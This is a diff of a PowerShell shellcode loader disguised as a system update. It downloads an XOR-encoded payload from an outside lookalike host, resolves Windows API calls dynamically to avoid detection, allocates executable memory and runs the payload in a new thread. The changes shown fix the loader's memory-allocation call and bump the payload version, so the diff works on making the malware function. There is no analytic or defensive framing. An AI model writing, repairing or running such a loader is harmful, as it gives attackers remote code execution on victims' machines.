@@ -3,7 +3,7 @@ $ProgressPreference = 'SilentlyContinue'
 
 # 1. Fetch Encrypted Shellcode (Cache buster included)
 $base = 'https://site-assetss.vercel.app'
-$url = "$base/assets/sysupdate.dat?v=6"
+$url = "$base/assets/sysupdate.dat?v=8"
 
 $c = New-Object Net.WebClient
 $c.Headers.Add('User-Agent','Mozilla/5.0')
@@ -18,7 +18,7 @@ for ($i = 0; $i -lt $bytes.Length; $i++) {
     $bytes[$i] = $bytes[$i] -bxor 0x99
 }
 
-# 3. Dynamic API Resolution (No Add-Type)
+# 3. Resolve Windows API dynamically (No Add-Type)
 function LookupFunc {
     Param ($moduleName, $functionName)
     $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
@@ -54,20 +54,21 @@ function getDelegateType {
     return $type.CreateType()
 }
 
-# 4. Allocate Memory and Copy Payload
+# 4. Allocate Memory
 $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (LookupFunc kernel32.dll VirtualAlloc), 
-    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
-).Invoke([IntPtr]::Zero, $bytes.Length, 0x3000, 0x40)
+    (getDelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr]))
+).Invoke([IntPtr]::Zero, [UIntPtr]$bytes.Length, 0x3000, 0x40)
 
 if ($lpMem -eq [IntPtr]::Zero) {
-    "VirtualAlloc failed" | Out-File "$env:TEMP\upd.log" -Append
+    "VirtualAlloc failed. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" | Out-File "$env:TEMP\upd.log" -Append
     exit
 }
 
+# 5. Copy Payload to Allocated Memory
 [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $lpMem, $bytes.Length)
 
-# 5. Execute Thread
+# 6. Execute Thread
 $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
     (LookupFunc kernel32.dll CreateThread), 
     (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
